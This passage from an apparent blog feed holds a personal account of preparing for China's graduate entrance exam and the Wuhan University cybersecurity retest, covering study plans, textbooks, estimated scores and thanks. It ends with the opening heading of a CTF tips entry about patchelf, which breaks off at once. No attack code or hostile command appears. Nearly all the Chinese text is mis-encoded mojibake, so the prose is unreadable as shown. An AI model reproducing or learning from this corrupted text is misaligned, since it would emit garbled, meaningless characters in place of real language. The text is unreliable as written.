æœˆå¼€å§‹å‡†å¤‡ã€‚</p><p>åŸºç¡€é˜¶æ®µï¼šèµ·åˆæˆ‘è·Ÿçš„æ˜¯æ±¤å®¶å‡¤çš„é›¶åŸºç¡€ç­ï¼Œä¸»è¦æ˜¯é‡æ¸©ä¸€äº›åŸºç¡€æ¦‚å¿µï¼Œè¾¹çœ‹è¾¹åšä¸€äº›ç¬”è®°ï¼Œåˆ° 3 æœˆå¤šæ‰çœ‹å®Œã€‚ç„¶å 4 æœˆå·¦å³å¼€å§‹è·Ÿæ­¦å¿ ç¥¥çš„åŸºç¡€è¯¾ï¼Œä»¥é«˜æ•°ä¸ºä¸»ï¼ŒæœŸé—´ä½¿ç”¨çš„ä¹ é¢˜å†Œæ˜¯æ±¤å®¶å‡¤çš„ã€Š1800ã€‹é¢˜ï¼Œåªå†™äº†åŸºç¡€ç¯‡ï¼ŒåŸºæœ¬ä¸Šæ˜¯çœ‹ä¸€ç« å†™ä¸€ç« ï¼Œæœ‰äº›çœ‹ä¸å¤ªæ‡‚çš„ç­”æ¡ˆæ€è·¯ä¼šæ‹ä¸‹æ¥ï¼Œåœ¨åƒé¥­è·¯ä¸Šæ€è€ƒï¼Œå¾ˆå¤šæ—¶å€™è‡ªç„¶å°±æƒ³é€šäº†ã€‚åœ¨ 6 æœˆåº•å‰ä¹Ÿå°±æ˜¯æš‘å‡å¼€å§‹å‰ï¼Œè·Ÿå®Œ<strong>æ­¦å¿ ç¥¥é«˜æ•°</strong>å’Œ<strong>ææ°¸ä¹çº¿ä»£</strong>çš„åŸºç¡€ç­ï¼Œåˆ·å®Œäº†ã€Š1800ã€‹çš„åŸºç¡€ç¯‡ï¼Œç®—æ˜¯åŸºæœ¬äº†è§£äº†é«˜æ•°/çº¿ä»£åŸºç¡€è€ƒç‚¹ã€‚</p><p>å¼ºåŒ–é˜¶æ®µï¼š7 æœˆæš‘å‡ç•™æ ¡ï¼Œå¼€å¯å¼ºåŒ–é˜¶æ®µã€‚è·Ÿçš„æ˜¯æ­¦å¿ ç¥¥çš„é«˜æ•°å¼ºåŒ–è¯¾å’Œææ°¸ä¹çš„çº¿ä»£å¼ºåŒ–è¯¾ï¼Œä¹ é¢˜å†Œåªç”¨äº†<strong>ã€Š660ã€‹</strong>å’Œ<strong>ã€Š880ã€‹</strong>ï¼Œè·Ÿä»¥å¾€æ€è·¯ä¸€æ ·ï¼Œä¹Ÿæ˜¯çœ‹ä¸€ç« åšä¸€ç« ï¼Œåšå®Œä¹‹åæ•´ä¸ªäººéƒ½é€šé€äº†å¾ˆå¤šï¼Œå¤§æ¦‚åˆ° 9 æœˆä¸­æ—¬åˆ·å®Œäº†è¿™ä¸¤æœ¬ä¹ é¢˜å†Œã€‚</p><p>åˆ·é¢˜å·©å›ºé˜¶æ®µï¼šæ¥ç€å¼€å§‹åˆ·æ•°å­¦å†å¹´çœŸé¢˜ï¼Œä» 1987 å¼€å§‹ï¼Œä¸€å¤©åˆ·ä¸€ä»½ï¼ˆæ—©æœŸçš„æ¯”è¾ƒç®€å•ï¼Œå¯ä»¥ä¸€å¤©åˆ·ä¸¤ä»½ï¼‰ï¼Œ150 åˆ†çš„å·åªç»™è‡ªå·±è®¡æ—¶ 2 ä¸ªå°æ—¶ 30 åˆ†é’Ÿï¼Œæ—©ä¸Šåˆ·å®Œå›å»åˆç¡ï¼Œç„¶åä¸‹åˆå›æ¥è®¢æ­£ã€‚å¦‚æœæ²¡æœ‰å¤ªå¤šæ—¶é—´æˆ–è€…åŸºç¡€æ¯”è¾ƒå¥½çš„è¯ï¼ŒçœŸé¢˜å¯ä»¥ç›´æ¥ä» 2008 å¹´å¼€å§‹åˆ·ã€‚å¤§æ¦‚ 11 æœˆå·¦å³å„å¤§åå¸ˆçš„é¢„æµ‹å·éƒ½è¦å‡ºå¥½äº†ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯<strong>å¼ å®‡8+4</strong> å’Œ<strong>ææ—6+4</strong>ï¼Œä¹Ÿæ˜¯ä¸€å¤©åˆ·ä¸€ä»½ã€‚å¼ å®‡å·å†™å¾—æˆ‘æƒ³å“­ï¼Œåˆ†å·®æå¤§ï¼Œè¦ä¹ˆå†™å¾—ç‰¹åˆ«å¥½ï¼Œè¦ä¹ˆåŠ¨ä¸åŠ¨ 90+ï¼Œææ—è¿˜å¥½ï¼ŒåŸºæœ¬éƒ½æœ‰ 110+ã€‚ä½†é¢„æµ‹å·å®Œå…¨è¯´æ˜ä¸äº†ä»€ä¹ˆï¼Œä¸è¦å¤ªç„¦è™‘äº†ï¼Œä¸»è¦æ‹¿æ¥æŸ¥æ¼è¡¥ç¼ºç”¨çš„ï¼Œä½†è¦<strong>åšæŒåšä¿æŒæ‰‹æ„Ÿ</strong>ã€‚æœ‰äº›é¢˜ç›®ä¸æ‡‚å¯ä»¥å» bilibili æ‰¾ä¸€äº›å¤§ä½¬ up ä¸»çš„è§†é¢‘çœ‹çœ‹ï¼Œä¸ªäººæ¯”è¾ƒæ¨èï¼šæ²¡å’‹äº†ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œæ•°å­¦çš„æ¯ä¸ªé˜¶æ®µéƒ½å¾ˆé‡è¦ï¼Œæ˜¯éœ€è¦æ¯å¤©èŠ±å¤§æŠŠæ—¶é—´çš„ï¼Œæˆ‘ä¸»è¦å‰ä¸­æœŸèŠ±çš„æ—¶é—´æ¯”è¾ƒå¤šï¼Œç™½å¤©ä¸Šä¸‹åˆéƒ½æ‹¿æ¥å¤ä¹ æ•°å­¦ï¼Œç„¶ååæœŸåˆ·é¢˜é˜¶æ®µå°±æ˜¯æ—©ä¸Šåˆ·ä¸€å¥—æ•°å­¦å·å­ï¼Œä¸‹åˆèŠ±ä¸€ä¸ªå°æ—¶ä¸åˆ°çš„æ—¶é—´çº é”™ï¼Œçº é”™å®Œåçš„æ—¶é—´ç»™æ”¿æ²»å’Œè‹±è¯­ã€‚å¯¹äºåå¸ˆçš„é€‰æ‹©ï¼Œå¼ å®‡å’Œæ­¦å¿ ç¥¥éƒ½å¯ä»¥å§ï¼Œèº«è¾¹ç ”å‹éƒ½è¯´æŒºä¸é”™çš„ï¼Œä½†æœ€åè¿˜å¾—æ˜¯é è‡ªå·±ã€‚</p><p>ps. æœ€åè€ƒè¯•çš„æ—¶å€™æ•°å­¦é€‰æ‹©åªç®—äº†ä¸€éï¼Œé€‰é¡¹åˆ†å¸ƒ 1 3 3 3ï¼Œè®©æˆ‘æœ‰ç‚¹å®³æ€•ï¼Œä½†æˆ‘è¿˜æ˜¯åšæŒç¬¬ä¸€æ„Ÿè§‰ï¼Œå¿ƒç†æƒ³ç€é¡¶å¤šé”™ä¸€é“ï¼Œç¨³ä¸€ç‚¹ï¼Œæœ€åé€‰æ‹©å…¨å¯¹ï¼Œä½†å¡«ç©ºé¢˜ç¬¬ä¸€é¢˜å°±é”™äº†ï¼Œè®©æˆ‘å¾ˆæ— è¯­ï¼Œæ‰€ä»¥<strong>ç®€å•é¢˜æœ‰æ—¶é—´å¾—å¤šéªŒç®—</strong>ğŸ˜­ã€‚çœ‹åˆ°å¤§é¢˜çš„æ—¶å€™æœ‰ç‚¹ç‚¹æ‡µï¼Œæ„Ÿè§‰ä¸åƒå¾€å¸¸çš„é¢˜å‹ï¼Œä½†åšä¸‹å»å‘ç°ä¹Ÿåªæ˜¯å¥—äº†å±‚çš®ï¼Œä¹ŸåŸºæœ¬ä¸€éè¿‡ï¼Œé™¤äº†è¯æ˜é¢˜ç¬¬äºŒé—®åŸºæœ¬éƒ½å†™å‡ºæ¥äº†ã€‚</p><p>ç”±äºæœ¬äººæ²¡æœ‰å¤æ ¸ï¼Œå‚è€ƒç½‘ä¸Šè¿˜ç®—æƒå¨çš„ç­”æ¡ˆï¼Œä¼°æ‘¸ç€å®¢è§‚70 + ä¸»è§‚59ã€‚</p><h3 id="408è®¡ç®—æœºä¸“ä¸šåŸºç¡€"><a href="#408è®¡ç®—æœºä¸“ä¸šåŸºç¡€" class="headerlink" title="408è®¡ç®—æœºä¸“ä¸šåŸºç¡€"></a>408è®¡ç®—æœºä¸“ä¸šåŸºç¡€</h3><p>è™½æ˜¯ç§‘ç­ï¼Œä½†æ²¡ä¸Šè¿‡è®¡ç»„å’Œæ“ä½œç³»ç»Ÿçš„è¯¾ç¨‹ã€‚ä¸è¿‡æœ‰äºŒè¿›åˆ¶å®‰å…¨å­¦ä¹ ç»å†ï¼Œå­¦èµ·æ¥ä¸ç®—å¤ªç´¯ã€‚è€ƒç ”æœŸé—´ï¼Œæˆ‘ä¸€èˆ¬æŠŠæ™šä¸Š 4 ä¸ªå°æ—¶å·¦å³çš„æ—¶é—´æ‹¿æ¥å¤ä¹  408ã€‚</p><p>å­¦ 408 è¦<strong>åå¤å¤šæ¬¡</strong>ï¼Œå‚è€ƒä¹¦ç”¨<strong>ç‹é“</strong>å°±å¤Ÿäº†ã€‚æˆ‘ 3 æœˆå¼€å§‹è·Ÿç‹é“çš„åŸºç¡€è¯¾ï¼Œçœ‹è¯¾é¡ºåºæ˜¯æ•°æ®ç»“æ„ã€è®¡ç»„ã€æ“ä½œç³»ç»Ÿã€è®¡ç½‘ï¼Œå¬ä¸€ç« è¯¾åšä¸€ç« è¯¾çš„è¯¾åä¹ é¢˜ï¼Œå¬çš„è¿‡ç¨‹ä¸­å¯ä»¥åšäº›ç®€å•çš„ç¬”è®°ï¼Œå¯ä»¥åšåœ¨ä¹¦ä¸Šï¼Œä¹Ÿå¯ä»¥åšåœ¨å¦å¤–çš„ç¬”è®°æœ¬ä¸Šã€‚æˆ‘å¤§æ¦‚æ˜¯ 6 æœˆå¤šå¬å®Œç¬¬ä¸€éåï¼Œå‘ç°å¾ˆå¤šä¹‹å‰çš„æ¦‚å¿µéƒ½ä¼šå¿˜æ‰äº†ã€‚è¿™æ˜¯æ­£å¸¸çš„ï¼Œ408 å†…å®¹æ¯”è¾ƒå¤šï¼Œçœ‹åˆ°ç¬¬äºŒéç¬¬ä¸‰éå›å¿†å¾—ä¼šè¶Šæ¥è¶Šæ¥å¿«ã€‚</p><p>æˆ‘ 6 æœˆåä¹Ÿå°±æ˜¯æš‘å‡æœŸé—´åˆç»†å¬äº†ä¸€éåŸºç¡€è¯¾ï¼Œä¸€äº›ç®—æ³•è¿‡ç¨‹ã€PV æ“ä½œéƒ½è·Ÿç€åœ¨çº¸ä¸Šæ¨¡æ‹Ÿäº†ä¸€éï¼Œå¦å¤–åšäº†åšåšçš„å…­æœ¬ç¬”è®°æœ¬ï¼Œæœ€åè‡ªå·±æ•´ç†çš„æ—¶å€™ä¹Ÿè¿˜ç®—æ˜¯æœ‰ç”¨ã€‚ï¼ˆä½†ç¬”è®°åšå¾—å¤ªå†—æ‚äº†ï¼Œè€Œä¸”æ—¶é—´æˆæœ¬é«˜ï¼Œç²¾ç®€ç‚¹ä¼šå¥½äº›ï¼‰</p><p>9 æœˆå¼€å§‹ä¼šæ¯”è¾ƒè¿·èŒ«ï¼Œæ„Ÿè§‰å¾ˆå¤šéƒ½å­¦äº†ï¼Œé€‰æ‹©é¢˜èƒ½åšï¼Œä½†è¯•å·å¤§é¢˜è¿˜æ˜¯ä¸ä¼šï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥å¼€å§‹è·Ÿç‹é“çš„å¼ºåŒ–è¯¾ï¼ˆå¾ˆé‡è¦ï¼Œå¯ä»¥æ›´æ—©å¼€å§‹ï¼ï¼ï¼‰ï¼Œå¼ºåŒ–è¯¾ä¸»è¦å¯¹<strong>å¸¸è§è€ƒç‚¹</strong>åšäº†æ¢³ç†ï¼Œä¼šèŠ±å‡ ä¸ªè¯¾æ—¶å¸®ä½ ç†è§£ä¸€ä¸ªçŸ¥è¯†åˆ†æ”¯ï¼Œä¹Ÿä¼šæ•™ä¸€äº›ç­”é¢˜æŠ€å·§ã€‚10 æœˆå¼€å§‹å°±æ˜¯åˆ·çœŸé¢˜ï¼Œ<strong>çœŸé¢˜ç‰¹åˆ«ç‰¹åˆ«é‡è¦ï¼Œå› ä¸ºçŸ¥è¯†ç‚¹ä¼šåå¤è€ƒï¼ï¼ï¼ï¼</strong>æˆ‘æ˜¯æ¯å¤©æ™šä¸Šè®¡æ—¶åšä¸€å¼ ï¼Œç„¶åæ”¾åˆ°ç¬¬äºŒå¤©ä¸‹åˆå’Œæ•°å­¦ä¸€èµ·æ ¡å¯¹ã€‚æœ‰æ—¶é—´çš„è¯çœŸé¢˜ä¸€å®šè¦å¤šè¿‡å‡ è½®ï¼Œæˆ‘ç¬¬ä¸€è½®æ˜¯è‡ªå·±å†™ä¸€éï¼Œç¬¬äºŒè½®å°±æ˜¯çœ‹ä¸€é¢˜æ ¡å¯¹ä¸€é¢˜ï¼Œè¦æŠŠæ¯ä¸ªé€‰æ‹©é¢˜é€‰é¡¹éƒ½ææ¸…æ¥šï¼Œå¤§é¢˜æŠŠå‡ ä¸ªå¸¸è§ç®—æ³•ã€PV æ“ä½œéƒ½å¤šé»˜å†™å‡ éã€‚æœ‰ç©ºå¯ä»¥å†å†™ä¸€éç‹é“è¯¾åä¹ é¢˜ï¼ŒæŸ¥æ¼è¡¥ç¼ºï¼ŒæŠŠä¸€äº›é™Œç”Ÿçš„çŸ¥è¯†ç‚¹è®°å½•åœ¨ä¸‹æ¥ï¼Œä¸»æ‰“ä¸€ä¸ª<strong>åå¤å¤šæ¬¡</strong>ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œå­¦ 408 çš„è¿‡ç¨‹ä¸€å®šè¦æœ‰<strong>è€å¿ƒ</strong>ï¼Œæœ‰å¾ˆé•¿ä¸€æ®µæ—¶é—´æˆ‘éƒ½ä¼šè§‰å¾—è‡ªå·±å¥½åƒå•¥ä¹Ÿæ²¡å­¦æ‡‚ï¼Œä½†åˆ°äº†åæœŸå¼ºåŒ–ã€åˆ·å·é˜¶æ®µä¼šå‘ç°éƒ½æ˜¯é‚£å‡ ä¸ªçŸ¥è¯†ç‚¹åœ¨åå¤è€ƒï¼Œæ‰€ä»¥æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†åˆ†æ•°åŠªåŠªåŠ›å°±èƒ½æ‹¿åˆ°ã€‚  </p><p>ps. ä»Šå¹´æ­»åœ¨æ•°æ®ç»“æ„ä¸Šäº†ï¼Œå…‰æ•°æ®ç»“æ„é€‰æ‹©å°±é”™äº† 5 ä¸ªï¼Œå…¶ä»–æ¯é—¨é€‰æ‹©éƒ½åªé”™ 1 ä¸ªï¼Œæ•°æ®ç»“æ„ç¬¬äºŒå¤§é¢˜å¤–éƒ¨æ’åºç®—æ³•æ€æƒ³æ²¡æƒ³èµ·æ¥ï¼Œå°±å¯¹äº†ç¬¬äºŒå°é—®ï¼Œæ“ä½œç³»ç»Ÿæœ‰ä¸€å¤§é¢˜æ’åºçš„ä¹Ÿçº ç»“äº†å¾ˆä¹…ã€‚æ ¡å¯¹å®Œç­”æ¡ˆä¸€ç›´è§‰å¾—è‡ªå·±åªæœ‰ 100 åˆ†å·¦å³ï¼Œæ‹…å¿ƒäº†å¥½ä¹…ğŸ˜­ï¼Œå¥½åœ¨æœ€åç»“æœè¿˜ä¸é”™ã€‚</p><p>ç”±äºæœ¬äººæ²¡æœ‰å¤æ ¸ï¼Œå‚è€ƒç½‘ä¸Šè¿˜ç®—æƒå¨çš„ç­”æ¡ˆï¼Œä¼°æ‘¸ç€å®¢è§‚64 + ä¸»è§‚46ã€‚</p><h2 id="å¤è¯•è§„åˆ’"><a href="#å¤è¯•è§„åˆ’" class="headerlink" title="å¤è¯•è§„åˆ’"></a>å¤è¯•è§„åˆ’</h2><p>æ­¦å®‰å¤è¯•åŒ…æ‹¬ç¬”è¯•å’Œç»¼åˆé¢è¯•ï¼ˆä¸»è¦æ˜¯è‹±è¯­é¢è¯•å’Œä¸“ä¸šé¢è¯•ï¼‰ã€‚</p><p>åŸºæœ¬é—®é¢˜ä¹‹å‰æœ‰å­¦é•¿æ€»ç»“è¿‡ï¼š<a href="https://blog.wangx.wang/index.php/archives/171/">å…³äºæ­¦å¤§ç½‘å®‰å¤è¯•çš„ä¸€äº›QA</a>ï¼Œç”±äºä¸èƒ½é€éœ²å…·ä½“å†…å®¹ï¼Œå°±ç®€å•è®²è®²å¦‚ä½•å‡†å¤‡çš„ã€‚</p><h3 id="ç¬”è¯•"><a href="#ç¬”è¯•" class="headerlink" title="ç¬”è¯•"></a>ç¬”è¯•</h3><p>å‚è€ƒä¹¦ç›®ï¼šã€Šä¿¡æ¯ç³»ç»Ÿå®‰å…¨æ¦‚è®ºã€‹ï¼ŒçŸ³æ–‡æ˜Œè‘—ã€‚ç¬¬äºŒç¬¬ä¸‰ç‰ˆéƒ½å¯ä»¥ã€‚</p><p>è€ƒå¯Ÿçš„è¯¾å†…çŸ¥è¯†æ¯”è¾ƒåŸºç¡€ï¼Œä»<strong>æ¦‚å¿µã€ä¼˜ç¼ºç‚¹ã€å®ç°æ–¹æ³•ã€ä¾‹å­</strong>è¿™å‡ ä¸ªè§’åº¦æ•´ç†å³å¯ã€‚</p><p>æœ‰æ¶‰åŠä¸€äº›è¯¾å¤–çš„çŸ¥è¯†ï¼Œä½†é—®å¾—ä¹Ÿå¾ˆå¼€æ”¾ã€‚</p><p>ps. æœ€åå†™å¾—æ»¡æ»¡å½“å½“ï¼Œæ‹¿äº†ä¸ª 80 å¹³å‡åˆ†ã€‚</p><h3 id="é¢è¯•"><a href="#é¢è¯•" class="headerlink" title="é¢è¯•"></a>é¢è¯•</h3><p>å¤è¯•è‹±è¯­å‚è€ƒæ–‡ç« ï¼š<a href="http://www.cskaoyan.com/forum.php?mod=viewthread&tid=654288&highlight=%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD">19æ­¦å¤§ç½‘å®‰è‹±è¯­å£è¯­å‡†å¤‡èµ„æ–™åŠä¸€ç‚¹ä¸ªäººä½“ä¼š</a></p><p>è‹±è¯­é¢è¯•ï¼šå‚è€ƒä¸Šé¢çš„æ–‡ç« å‡†å¤‡äº†å°†è¿‘åæ¥ä¸ªæ—¥å¸¸é—®é¢˜ï¼Œæœ€åä¹ŸæŠ¼ä¸­äº†ä¸¤ä¸ªï¼Œæœ€å¥½ä¹Ÿå‡†å¤‡ä¸‹ä¸“ä¸šé—®é¢˜ã€‚è‹±è¯­é¢è¯•è¿‡ç¨‹ä¸­ï¼Œæ„Ÿè§‰è€ƒå®˜æ›´æ³¨é‡<strong>å£è¯­çš„æµç•…åº¦å’Œé€»è¾‘</strong>ï¼Œè€Œéå£è¯­å†…å®¹ï¼Œæ‰€ä»¥æ— éœ€å¤ªå¤šé«˜çº§è¯æ±‡ã€‚</p><p>ä¸“ä¸šé¢è¯•ï¼šå¯ä»¥äº¤<strong>ç®€å†</strong>ï¼Œä¹Ÿå»ºè®®æœ‰ç«èµ›ã€é¡¹ç›®ã€è®ºæ–‡çš„åŒå­¦äº¤ç®€å†ï¼Œå‰ææ˜¯è¦æ¸…æ¥šè‡ªå·±å·¥ä½œçš„éƒ¨åˆ†ã€‚<strong>æ¯•è®¾</strong>ä¹Ÿè¦å¥½å¥½å‡†å¤‡ä¸€ä¸‹ï¼Œå¦‚æœæ˜¯è·Ÿå®‰å…¨æœ‰å…³çš„ï¼Œè€å¸ˆå¾ˆå¯èƒ½ä¼šé—®ã€‚</p><p>ps. æˆ‘åœ¨é¢è¯•å‰å¤´è„‘ä¸€ç‰‡ç©ºç™½ï¼Œç´§å¼ å¾—è‡ªæˆ‘ä»‹ç»ä¹ŸèƒŒä¸é¡ºäº†ğŸ˜­ï¼Œå°±ç´¢æ€§æ”¾ç©ºè‡ªå·±ğŸ¤¯ï¼Œé¢è¯•çš„æ—¶å€™å°±æ˜¯æƒ³åˆ°å•¥è¯´å•¥ï¼Œç¼åˆäº†å¥½å¤šä¸ªæå‰å‡†å¤‡çš„å›ç­”ã€‚è€å¸ˆä»¬ä¹Ÿéƒ½å¾ˆå’Œè”¼ï¼Œè®¸å¤šæ·±å…¥çš„æ–¹å‘ä¹Ÿæ²¡æœ‰è¿½é—®ï¼Œæ—¶é—´å¾ˆå¿«å°±è¿‡å»å•¦~</p><p>æœ€ç»ˆæœ¬äººå¤è¯•æˆç»©æ„æ–™ä¹‹å¤–åœ°ä½äºå°ç»„ç¬¬ä¸€ï¼Œå±å®å—å® è‹¥æƒŠğŸ˜­ï¼Œæ„Ÿè°¢å„ä½è€å¸ˆæŠ¬çˆ±ã€‚</p><h2 id="ä¸ªäººå¿ƒå¾—ä¸è‡´è°¢"><a href="#ä¸ªäººå¿ƒå¾—ä¸è‡´è°¢" class="headerlink" title="ä¸ªäººå¿ƒå¾—ä¸è‡´è°¢"></a>ä¸ªäººå¿ƒå¾—ä¸è‡´è°¢</h2><h3 id="ä¸ªäººå¿ƒå¾—"><a href="#ä¸ªäººå¿ƒå¾—" class="headerlink" title="ä¸ªäººå¿ƒå¾—"></a>ä¸ªäººå¿ƒå¾—</h3><ul><li>è€ƒç ”æ‹©æ ¡å¾ˆé‡è¦ï¼Œä½†ä¹Ÿä¸ç”¨å¤ªæ—©å°±æ•²å®šè¦è€ƒæŸä¸ªå­¦æ ¡ï¼ŒåæœŸæ ¹æ®è‡ªèº«æƒ…å†µå’Œæ‹›ç”Ÿæ–¹æ¡ˆå†åšæŠ‰æ‹©ä¹Ÿä¸è¿Ÿã€‚å¦‚æœåªæ˜¯æƒ³å›¾ä¸ª 211 å­¦å†ï¼Œå¯ä»¥é€‰å†œæ—ã€è´¢ç»ã€å¸ˆèŒƒç±»çš„é«˜æ ¡çš„ä¸€äº›è®¡ç®—æœºäº¤å‰ä¸“ä¸šã€‚</li><li>å¦‚æœè€ƒè®¡ç®—æœºæ–¹å‘çš„ä¸“ä¸šï¼Œä¼˜å…ˆå‡†å¤‡ 408ï¼Œ408 æ˜¯å¤§åŠ¿æ‰€è¶‹ï¼Œè€Œä¸”åœ¨æˆ‘çœ‹æ¥ä¹Ÿæ˜¯ç§‘ç­å­¦ç”Ÿåº”å½“å…·å¤‡çš„çŸ¥è¯†åŸºç¡€ã€‚</li><li>IT ä¸“ä¸šè€ƒç ”éš¾åº¦ä¸€èˆ¬æ˜¯ï¼šè®¡ç®—æœº &gt; è½¯å·¥ â‰ˆ ç½‘å®‰ â‰ˆ äººå·¥æ™ºèƒ½ã€‚ä½†è¿‘å‡ å¹´å¤§å®¶ä¼¼ä¹éƒ½å¤ªè¿‡æ±‚ç¨³äº†ï¼Œä»Šå¹´æ‰©æ‹›çš„æ­¦å¤§ç½‘å®‰ä¸“ç¡•åˆ’çº¿ 355ï¼Œç¼©æ‹›çš„æ­¦å¤§è®¡ç§‘ä¸“ç¡•åˆ’çº¿ 360ï¼Œç¼©æ‹›çš„å¦å¤§è®¡ç§‘ä¸“ç¡•åˆ’çº¿ 350ï¼Œè€Œä¸”ç¦å»ºè¿˜æ˜¯æ°´åŒºï¼Œåªèƒ½è¯´è¢«åŠé€€çš„äººä¸å°‘ã€‚å¦å¤–ï¼Œåˆšæ”¹è€ƒ 408 çš„å—ç†å·¥å¥½åƒä¹Ÿç‚¸äº†ï¼Œå°±è¿åŒéä¹Ÿç‚¸å¾—ç¦»è°±ï¼Œè€ƒæˆ‘ä»¬æœ¬æ ¡ 22408 çš„è½¯å·¥ä¸“ç¡•å±…ç„¶èƒ½æœ‰ 391 çš„è€ƒç”Ÿï¼Œåªèƒ½è¯´å¤ªå·è¾£ï¼</li></ul><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052028047.png" alt="image-20230405202822686" style="zoom: 33%;" /><ul><li>å¯ä»¥é€šè¿‡ç›®æ ‡é™¢æ ¡çš„è€ƒç ”ç¾¤æ”¶é›†èµ„æ–™ï¼Œä¸€èˆ¬æ¥è¯´ç‹é“çš„ç¾¤æˆå‘˜äººæ•°å¤šä¸€äº›ã€‚æ‹›ç”Ÿä¿¡æ¯å‡ºåï¼Œç¾¤é‡Œå°±ä¼šå¼€å§‹â€œå¼•æµâ€å’Œâ€œåŠé€€â€ï¼Œå°±åƒæˆ‘åŸæœ¬åœ¨å¦å¤§è®¡ç§‘ç¾¤ï¼Œè¢«å¼•åˆ°äº†æ­¦å¤§ç½‘å®‰ç¾¤ã€‚å…¶æ¬¡ï¼Œåˆ‡å‹¿æ°´ç¾¤ï¼Œåæœˆç¡®è®¤é™¢æ ¡åæŠŠå…¶ä»–é™¢æ ¡çš„ç¾¤é€€äº†ã€‚</li><li>è­¦æƒ• Bä¹ åŒ¿åç”¨æˆ·æ‰“å¿ƒæ€ç‰Œï¼ŒåŠ¨ä¸åŠ¨â€œå°é“æ¶ˆæ¯â€ã€â€œå†…éƒ¨æ¶ˆæ¯â€ã€â€œä»Šå¹´çˆ†ç‚¸â€ï¼Œç»™ä»–ç‚¹ä¸ªğŸ‘çœ‹ä»–è¿˜å‘ä¸å‘ç”µï¼</li><li>æŒ‰ç…§è‡ªå·±æœ€å¥½çš„çŠ¶æ€å­¦ï¼Œä¸å¿…è·Ÿä¸Šåˆ«äººçš„èŠ‚å¥ã€‚åƒæˆ‘çš„å­¦ä¹ æ—¶é—´ä¸€èˆ¬æ˜¯æ—©ä¸Šï¼š9 ~ 12ï¼Œä¸‹åˆï¼š14 ~ 17ï¼Œæ™šï¼š18 ~ 22ã€‚å¶å°”ä¹Ÿä¼šæ‘¸ğŸŸï¼Œæ‰“æ‰“æ¸¸æˆä»€ä¹ˆçš„ï¼Œä½†æ‰“å®Œè®°å¾—å¸æ‰ï¼ˆç˜¾çŠ¯äº†ä¸‹å›æ¥åï¼Œæ‰“å®Œå†å¸ï¼‰ï¼Œç°åœ¨å¯¹æ¸¸æˆå·²æ— æ„Ÿï¼Ÿ</li><li>å’Œç ”å‹ä»¬å®šæœŸçº¦ä¸ªé¥­ï¼Œæ‰“å¡å‘¨è¾¹ä¸€äº›ç¾é£Ÿåº—ï¼Œé‡Šæ”¾è€ƒç ”å‹åŠ›ã€‚</li></ul><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052118011.png" alt="image-20230405211807371" style="zoom: 40%;" /><h3 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h3><p>æ„Ÿè°¢è€çˆ¸è€å¦ˆå› ä¸ºæ‹…å¿ƒæˆ‘çš„å¤è¯•æƒ…å†µè·‘æ¥æ­¦æ±‰ä¸ºæˆ‘åˆ†æ‹…å‹åŠ›ï¼ˆ<del>è™½ç„¶ä¸¤å¤©åå› ä¸ºæ°´åœŸä¸æœå°±å›å»äº†ï¼‰</del>ï¼Œæ„Ÿè°¢è€å§æ»´æ”¯æŒã€‚</p><p>æ„Ÿè°¢åˆ˜è€å¸ˆã€å®éªŒå®¤é‡Œçš„å­¦é•¿å­¦å§è¿˜æœ‰ä¸€èµ·æ‰“æ¯”èµ›çš„å¸ˆå‚…ä»¬ï¼Œç‰¹åˆ«æ„Ÿè°¢ <strong>@j1ang</strong> &amp; <strong>@4XWi11</strong> &amp; <strong>@scr1pt</strong>ï¼Œå¸¦ç€æˆ‘è¿™ä¸ªèœé¸¡æ··äº†å¥½å¤šå¥–ğŸ˜­ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052134673.png" alt="image-20230405213418516" style="zoom:40%;" /><p>æ„Ÿè°¢ <strong>@verf1sh</strong> å¸ˆå‚…å’Œ <strong>@tty</strong> å¸ˆå‚…ï¼Œåœ¨æˆ‘å­¦ä¹ äºŒè¿›åˆ¶çš„è¿‡ç¨‹ä¸­ç»™äº†æˆ‘å¾ˆå¤šå¯å‘ã€‚</p><p>æ„Ÿè°¢ HZNUï¼Œæ„Ÿè°¢æˆ‘çš„é¥­å‹ä»¬ï¼Œå†æ¬¡æ„Ÿè°¢æ‰€æœ‰å…³å¿ƒã€é¼“åŠ±ã€æ”¯æŒæˆ‘çš„å®¶äººå’Œæœ‹å‹ä»¬ã€‚</p><p>æœ€åæ„Ÿè°¢åŠªåŠ›äº†ä¸€å¹´çš„è‡ªå·±ğŸ™‚ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052158276.jpg" alt="img" style="zoom: 50%;" />]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304042018896.png&quot; alt=&quot;image-20230404201805060&quot; style=&quot;zoom: 25%;&quot; /&gt;</summary>
    
    
    
    <category term="other" scheme="http://example.com/categories/other/"/>
    
    
  </entry>
  
  <entry>
    <title>æŠ€å·§æ€»ç»“</title>
    <link href="http://example.com/2023/02/01/tricks/"/>
    <id>http://example.com/2023/02/01/tricks/</id>
    <published>2023-02-01T14:26:10.000Z</published>
    <updated>2023-06-08T07:04:12.432Z</updated>
    
    <content type="html"><![CDATA[<p>æ€»ç»“ä¸€äº›å¸¸ç”¨çš„æŠ€å·§ã€‚</p><span id="more"></span><h2 id="patchelfâ€”â€”æ›¿æ¢æ–‡ä»¶çš„libcå’Œld"><a href="#patchelfâ€”â€”æ›¿æ¢æ–‡ä»¶çš„libcå’Œld" class="headerlink" title="patchelfâ€”â€”æ›¿æ¢æ–‡ä»¶çš„libcå’Œld"></a>patchelfâ€”â€”æ›¿æ¢æ–‡ä»¶çš„libcå’Œld</h2><p>å¦‚æœå‡ºé¢˜æ–¹æ²¡æœ‰æä¾›<code>libc</code>å’Œ<code>ld</code>ï¼Œè¯·çœ‹æŠ€å·§<code>glibc-all-in-oneâ€”â€”æŸ¥æ‰¾libc/ld/.debug</code>ï¼š</p><p><img 